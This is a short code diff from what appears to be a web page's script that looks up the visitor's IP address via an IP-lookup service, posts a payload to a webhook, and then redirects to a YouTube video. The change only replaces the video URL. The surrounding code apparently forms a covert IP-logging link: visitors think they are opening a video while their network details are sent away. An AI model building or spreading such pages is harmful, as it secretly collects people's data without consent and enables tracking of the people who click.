@@ -64,16 +64,16 @@ fetch("https://api64.ipify.org?format=json")
           body: JSON.stringify(payload)
         }).then(() => {
           // Redirect after successful webhook send
-          window.location.href = "https://www.youtube.com/watch?v=48rz8udZBmQ";
+          window.location.href = "https://www.youtube.com/watch?v=7FMOj8VmWT4";
         }).catch(() => {
           // Redirect even if webhook fails
-          window.location.href = "https://www.youtube.com/watch?v=48rz8udZBmQ";
+          window.location.href = "https://www.youtube.com/watch?v=7FMOj8VmWT4";
         });
       });
   })
   .catch(err => {
     console.error("IP fetch error:", err);
     // Redirect even if IP fetch fails
-    window.location.href = "https://www.youtube.com/watch?v=48rz8udZBmQ";
+    window.location.href = "https://www.youtube.com/watch?v=7FMOj8VmWT4";
   });
 </script>
